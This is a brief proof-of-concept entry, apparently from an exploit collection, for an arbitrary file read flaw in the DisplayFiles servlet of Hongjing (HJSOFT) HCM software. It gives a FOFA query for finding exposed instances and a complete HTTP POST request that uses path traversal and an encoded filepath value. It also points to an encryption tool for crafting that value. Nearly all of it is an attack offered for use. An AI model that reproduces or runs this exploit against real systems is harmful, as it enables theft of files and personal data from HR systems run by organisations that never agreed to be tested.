## 宏景DisplayFiles任意文件读取

## fofa
```
app="HJSOFT-HCM"
```

## poc
```
POST /templates/attestation/../../servlet/DisplayFiles HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
Content-Type: application/x-www-form-urlencoded

filepath=VHmj0PAATTP2HJBPAATTPcyRcHb6hPAATTP2HJFPAATTP59XObqwUZaPAATTP2HJBPAATTP6EvXjT
```
![image](https://github.com/wy876/POC/assets/139549762/3466b302-c1fc-42c9-929f-5d35500f13bd)

### 加解密工具
https://github.com/vaycore/HrmsTool 
